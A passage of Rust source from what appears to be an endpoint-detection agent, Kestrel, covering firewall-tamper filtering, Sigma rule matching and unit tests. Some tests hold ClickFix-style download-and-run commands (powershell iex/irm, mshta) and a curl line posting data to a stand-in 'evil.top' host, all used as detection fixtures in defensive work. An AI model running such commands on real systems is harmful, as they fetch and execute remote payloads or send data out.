            // its own default filters. Kept visible, Low Audit.
            hit.severity = Severity::Low;
            hit.mode_override = Some(RuleMode::Audit);
            hit.summary.push_str(" — Windows Firewall / BFE refreshing its own default filters (built-in BFE provider or Defender's `windefend_*` filter added by a Windows service); review only if unexpected");
        }
        self.state(&e.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    /// FP-10: a WFP change report (`kestrel-win` `wfp_tamper` text:
    /// "WFP filter '<name>' changed at <layer> by pid <pid> (provider
    /// '<provider name>' <key>, change <type>, action <action>)") that is
    /// Windows Firewall's own refresh: change type Add (`%%16384`), and
    /// either the provider is BFE's built-in one (`@bfe.dll,...`) or the
    /// filter is Defender's `windefend_*` with no provider; and the changing
    /// process, when Kestrel knows it, is a trusted, untampered Windows
    /// binary (an EDR-silencer tool naming its filter `windefend_x` runs as
    /// its own image). Kestrel's own objects are reported differently and
    /// never match.
    fn os_firewall_refresh(&self, detail: &str) -> bool {
        let d = detail.to_ascii_lowercase();
        let Some(name) = d
            .strip_prefix("wfp filter '")
            .and_then(|r| r.split_once('\''))
            .map(|(n, _)| n.to_string())
        else {
            return false;
        };
        if !d.contains("change %%16384") {
            return false;
        }
        let bfe = d.contains("provider '@bfe.dll,");
        let windefend = name.starts_with("windefend_")
            && d.contains("provider '-' {00000000-0000-0000-0000-000000000000}");
        if !(bfe || windefend) {
            return false;
        }
        let pid = d
            .split_once(" by pid ")
            .and_then(|(_, r)| r.split_whitespace().next())
            .and_then(|p| p.parse::<u32>().ok());
        match pid.and_then(|p| self.table.by_pid(p)) {
            Some(p) => {
                p.image.is_empty()
                    || (Self::system_trusted(p) && !self.tainted(&p.guid))
                    || self.protected(p)
            }
            None => true,
        }
    }

    // ------------------------------------------------------------------
    // Sigma
    // ------------------------------------------------------------------

    fn eval_sigma(&mut self, e: &Event) {
        // NEW-3: on registry / task / service / WMI events the subject may be
        // a correlation guess or unknown; such hits never carry actions.
        let mut attr = if crate::families::carries_attribution(e) {
            crate::families::attribution_of(e)
        } else {
            Attribution::Exact
        };
        if self.is_agent_owned(&e.guid) {
            if attr != Attribution::Heuristic {
                return;
            }
            // A guess landing on the agent: the writer is unknown (V-H6).
            attr = Attribution::None;
        }
        let proc_ = self.table.get(&e.guid);
        let parent = proc_.and_then(|p| self.table.parent_of(p));
        let view = SigmaEvent {
            event: e,
            proc_,
            parent,
        };
        let matched: Vec<usize> = self
            .sigma
            .iter()
            .enumerate()
            .filter(|(_, r)| r.route.matches(e) && sigma::matches(r, &view))
            .map(|(i, _)| i)
            .collect();
        for i in matched {
            let meta = self.sigma[i].meta.clone();
            let p = if attr == Attribution::None {
                unknown_subject(e.ts, &changed_object(e))
            } else {
                self.proc_info(e)
            };
            let mut hit = Hit::new(
                &meta.id,
                &p.guid,
                meta.severity,
                format!(
                    "Custom rule \"{}\" matched {} by {}",
                    meta.name,
                    event_phrase(e),
                    describe(&p)
                ),
            );
            hit.name = Some(meta.name.clone());
            hit.author = meta.author.clone();
            hit.attack = Some(meta.attack.clone());
            if attr == Attribution::Exact {
                hit.actions.push(kill(&p, true));
            } else {
                // Alert only, whatever the rule's mode (`Off` still silences it).
                if self.mode(&meta.id) == RuleMode::Off {
                    continue;
                }
                hit.mode_override = Some(RuleMode::Audit);
                hit.remediation_only = true;
                hit.summary.push_str(if attr == Attribution::None {
                    " (writer unknown; alert only)"
                } else {
                    " (writer inferred by correlation; alert only)"
                });
                if attr == Attribution::None {
                    hit.process = Some(p.clone());
                }
            }
            self.state(&p.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }
}

fn word_pos(hay: &str, w: &str) -> Option<usize> {
    let hb = hay.as_bytes();
    let mut start = 0;
    while let Some(i) = hay[start..].find(w) {
        let s = start + i;
        let e = s + w.len();
        if (s == 0 || !hb[s - 1].is_ascii_alphanumeric())
            && (e >= hb.len() || !hb[e].is_ascii_alphanumeric())
        {
            return Some(s);
        }
        start = s + 1;
    }
    None
}

fn event_phrase(e: &Event) -> String {
    match &e.data {
        EventData::ProcessStart(p) => format!("process start \"{}\"", truncate(&p.cmdline, 120)),
        EventData::FileAccess { path, op } => {
            format!("{op:?} of {}", truncate(path, 120)).to_lowercase()
        }
        EventData::NetConnect {
            dst_ip,
            dst_port,
            dst_host,
            ..
        } => match dst_host {
            Some(h) => format!("a connection to {dst_ip}:{dst_port} ({h})"),
            None => format!("a connection to {dst_ip}:{dst_port}"),
        },
        EventData::DnsQuery { qname, .. } => format!("a DNS lookup of {qname}"),
        EventData::RegistrySet {
            key, value_name, ..
        } => format!("a registry write to {}\\{value_name}", truncate(key, 100)),
        EventData::ProcessAccess(t) => format!(
            "access to {} (0x{:x})",
            crate::paths::file_name(&t.target_image),
            t.granted_access
        ),
        EventData::RemoteThread(t) => format!(
            "a remote thread into {}",
            crate::paths::file_name(&t.target_image)
        ),
        EventData::ImageLoad { path, .. } => format!("a load of {}", truncate(path, 120)),
        EventData::ScriptBlock { content, .. } => {
            format!("script \"{}\"", truncate(content.trim(), 80))
        }
        other => format!("a {} event", other.kind().as_str()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn agent_image_key_keeps_the_drive_v_h1() {
        let k = agent_image_key(r"C:\Program Files\Kestrel\kestrel-agent.exe", 'c');
        assert_eq!(k, r"c:\program files\kestrel\kestrel-agent.exe");
        assert_eq!(
            agent_image_key(r"\Program Files\Kestrel\kestrel-agent.exe", 'd'),
            r"d:\program files\kestrel\kestrel-agent.exe"
        );
        assert_eq!(agent_image_key("  ", 'c'), "");
        assert_eq!(agent_image_key(r"\\srv\share\kestrel-agent.exe", 'c'), "");
    }

    #[test]
    fn never_quarantine_task_and_key_stores_v_h4() {
        assert!(never_quarantine(
            r"C:\Windows\System32\Tasks\Microsoft\Windows\Defrag\ScheduledDefrag"
        ));
        assert!(never_quarantine(
            r"C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\abc"
        ));
        assert!(never_quarantine(r"C:\Users\alice\..\bob\x"));
        assert!(!never_quarantine(
            r"C:\Users\alice\AppData\Local\Temp\x.exe"
        ));
    }

    #[test]
    fn clickfix_patterns() {
        assert!(clickfix_reason(
            "powershell -w h -c \"iex(irm https://x.top/a)\"",
            "powershell.exe"
        )
        .is_some());
        assert!(clickfix_reason(
            "cmd /c start chrome # i am not a robot - verification id 4411",
            "cmd.exe"
        )
        .is_some());
        assert!(clickfix_reason("mshta https://x.top/verify.hta", "mshta.exe").is_some());
        assert!(clickfix_reason("powershell.exe", "powershell.exe").is_none());
        assert!(clickfix_reason("cmd /c dir", "cmd.exe").is_none());
        assert_eq!(
            runmru_lolbin("powershell -w h -c iex(irm https://x)\\1"),
            Some("powershell")
        );
        assert_eq!(
            runmru_lolbin("mshta https://evil/cap.hta # verify you are human\\1"),
            Some("mshta")
        );
        assert_eq!(runmru_lolbin("cmd\\1"), None);
        assert_eq!(runmru_lolbin("notepad\\1"), None);
        assert_eq!(
            runmru_lolbin("conhost --headless powershell x\\1"),
            Some("conhost")
        );
    }

    #[test]
    fn flags() {
        let sw =
            crate::legit_apps::switches("chrome.exe --remote-debugging-port=9333 -headless /x");
        assert!(sw.contains(&("remote-debugging-port".into(), Some("9333".into()))));
        assert!(sw.contains(&("headless".into(), None)));
        assert!(sw.contains(&("x".into(), None)));
    }

    #[test]
    fn exclusion_matching() {
        let p = ProcessInfo {
            guid: ProcessGuid("g".into()),
            pid: 5,
            ppid: 1,
            parent_guid: None,
            image: r"C:\Program Files\KeePass Password Safe 2\KeePass.exe".into(),
            cmdline: String::new(),
            user: None,
            integrity: None,
            start_ts: 0,
            exit_ts: None,
            signer: Some("Dominik Reichl".into()),
            signed: SignatureState::Valid,
            sha256: Some("AA".into()),
            motw_zone: None,
            file_size: None,
            path_class: PathClass::ProgramFiles,
        };
        let mk = |kind, value: &str, rule: Option<&str>, exp: Option<i64>| {
            Excl::new(
                &Exclusion {
                    id: "x".into(),
                    kind,
                    value: value.into(),
                    rule_id: rule.map(Into::into),
                    expires_at: exp,
                    reason: String::new(),
                },
                'c',
            )
        };
        let m = |x: &Excl, p: &ProcessInfo, rule: &str, now: i64| x.matches(p, rule, now, 'c');
        assert!(m(
            &mk(
                ExclusionKind::Path,
                r"C:\Program Files\KeePass*\KeePass.exe",
                None,
                None
            ),
            &p,
            "ST-01",
            0
        ));
        assert!(m(
            &mk(
                ExclusionKind::Path,
                r"c:\program files\keepass password safe 2",
                None,
                None
            ),
            &p,
            "ST-01",
            0
        ));
        assert!(!m(
            &mk(ExclusionKind::Path, r"c:\program files\keep", None, None),
            &p,
            "ST-01",
            0
        ));
        assert!(m(
            &mk(ExclusionKind::Image, "keepass.exe", Some("ST-01"), None),
            &p,
            "ST-01",
            0
        ));
        assert!(!m(
            &mk(ExclusionKind::Image, "keepass.exe", Some("ST-01"), None),
            &p,
            "ST-02",
            0
        ));
        assert!(m(
            &mk(ExclusionKind::Sha256, "aa", None, None),
            &p,
            "ST-02",
            0
        ));
        assert!(m(
            &mk(ExclusionKind::Signer, "dominik reichl", None, Some(10)),
            &p,
            "ST-02",
            5
        ));
        assert!(!m(
            &mk(ExclusionKind::Signer, "dominik reichl", None, Some(10)),
            &p,
            "ST-02",
            10
        ));
        // Signer exclusions need a *valid* signature (Unknown does not count).
        let mut unk = p.clone();
        unk.signed = SignatureState::Unknown;
        assert!(!m(
            &mk(ExclusionKind::Signer, "dominik reichl", None, None),
            &unk,
            "ST-02",
            0
        ));
    }

    #[test]
    fn exclusion_paths_keep_the_drive_and_segments() {
        let mut p = ProcessInfo {
            guid: ProcessGuid("g".into()),
            pid: 5,
            ppid: 1,
            parent_guid: None,
            image: r"C:\Tools\backup.exe".into(),
            cmdline: String::new(),
            user: None,
            integrity: None,
            start_ts: 0,
            exit_ts: None,
            signer: None,
            signed: SignatureState::Unsigned,
            sha256: None,
            motw_zone: None,
            file_size: None,
            path_class: PathClass::Other,
        };
        let x = |v: &str| {
            Excl::new(
                &Exclusion {
                    id: "x".into(),
                    kind: ExclusionKind::Path,
                    value: v.into(),
                    rule_id: None,
                    expires_at: None,
                    reason: String::new(),
                },
                'c',
            )
        };
        let hit = |e: &Excl, img: &str, p: &mut ProcessInfo| {
            p.image = img.into();
            e.matches(p, "ST-01", 0, 'c')
        };
        let tools = x(r"C:\Tools\backup.exe");
        assert!(hit(&tools, r"C:\Tools\backup.exe", &mut p));
        assert!(hit(&tools, r"c:/tools/BACKUP.EXE", &mut p));
        // another volume (USB stick / mounted ISO) does not match
        assert!(!hit(&tools, r"E:\Tools\backup.exe", &mut p));
        // an unmapped device path has an unknown volume: never matches
        assert!(!hit(
            &tools,
            r"\Device\HarddiskVolume5\Tools\backup.exe",
            &mut p
        ));
        // driveless values are anchored on the system drive
        let driveless_x = x(r"\Tools\backup.exe");
        assert!(hit(&driveless_x, r"C:\Tools\backup.exe", &mut p));
        assert!(!hit(&driveless_x, r"D:\Tools\backup.exe", &mut p));
        // `*` stays inside one segment …
        let star = x(r"C:\Users\*\AppData\Local\Vendor\app.exe");
        assert!(hit(
            &star,
            r"C:\Users\bob\AppData\Local\Vendor\app.exe",
            &mut p
        ));
        assert!(!hit(
            &star,
            r"C:\Users\bob\Downloads\AppData\Local\Vendor\app.exe",
            &mut p
        ));
        // … `**` crosses segments
        let dstar = x(r"C:\Users\**\Vendor\app.exe");
        assert!(hit(
            &dstar,
            r"C:\Users\bob\AppData\Local\Vendor\app.exe",
            &mut p
        ));
        assert!(hit(&dstar, r"C:\Users\Vendor\app.exe", &mut p));
        assert!(!hit(&dstar, r"D:\Users\bob\Vendor\app.exe", &mut p));
        let any_name = x(r"C:\Tools\*.exe");
        assert!(hit(&any_name, r"C:\Tools\x.exe", &mut p));
        assert!(!hit(&any_name, r"C:\Tools\sub\x.exe", &mut p));
    }

    #[test]
    fn ioc_cidr() {
        let iocs = Iocs::build(&[
            Ioc {
                id: "1".into(),
                kind: IocKind::Ip,
                value: "185.10.0.0/16".into(),
                action: IocAction::Block,
                description: String::new(),
            },
            Ioc {
                id: "2".into(),
                kind: IocKind::Url,
                value: "https://evil.top/gate.php".into(),
                action: IocAction::Block,
                description: String::new(),
            },
        ]);
        assert!(iocs.by_ip("185.10.3.4").is_some());
        assert!(iocs.by_ip("185.11.3.4").is_none());
        assert!(iocs.by_domain("evil.top").is_some());
        assert!(iocs
            .by_url_in("curl https://evil.top/gate.php -d x")
            .is_some());
    }

    /// Review of the 1.1.7 integration, L1: a flood of tainted live
    /// processes never un-taints an earlier one (the set used to be
    /// cleared when full); exited processes are what gets pruned.
    #[test]
    fn taint_overflow_never_untaints_live_processes_l1() {
        let host = HostContext {
            boot_id: "b".into(),
            hostname: "h".into(),
            agent_image: r"C:\Program Files\Kestrel\kestrel-agent.exe".into(),
            agent_pid: 0,
            server_ips: vec![],
            system_drive: Some('c'),
        };
        let mut e = EngineState::new(host, Policy::default(), RuleBundle::default()).unwrap();
        let mk = |i: usize| ProcessInfo {
            guid: ProcessGuid(format!("p{i}")),
            pid: 10 + i as u32,
            ppid: 1,
            parent_guid: None,
            image: r"C:\Users\a\AppData\Local\Temp\x.exe".into(),
            cmdline: String::new(),
            user: None,
            integrity: None,
            start_ts: i as i64,
            exit_ts: None,
            signer: None,
            signed: SignatureState::Unsigned,
            sha256: None,
            motw_zone: None,
            file_size: None,
            path_class: PathClass::Temp,
        };
        let chrome = ProcessGuid("chrome".into());
        e.table.insert(ProcessInfo {
            guid: chrome.clone(),
            image: r"C:\Program Files\Google\Chrome\Application\chrome.exe".into(),
            path_class: PathClass::ProgramFiles,
            ..mk(0)
        });
        e.taint(chrome.clone());
        // Twice the old cap of live tainted processes.
        let n = MAX_TAINTED * 2 + 10;
        for i in 1..=n {
            e.table.insert(mk(i));
            e.taint(ProcessGuid(format!("p{i}")));
        }
        assert!(e.tainted(&chrome), "the injected browser stays tainted");
        assert!(e.tainted(&ProcessGuid("p1".into())));
        assert!(e.tainted(&ProcessGuid(format!("p{n}"))));
        assert_eq!(e.tainted_len(), n + 1);
        for i in 1..=n {
            e.table.mark_exit(&ProcessGuid(format!("p{i}")), 1);
        }
        // The next prune drops the exited ones only.
        for i in 0..=e.taint_prune_at {
            e.taint(ProcessGuid(format!("q{i}")));
        }
        assert!(e.tainted(&chrome));
        assert!(!e.tainted(&ProcessGuid("p1".into())));
    }
}
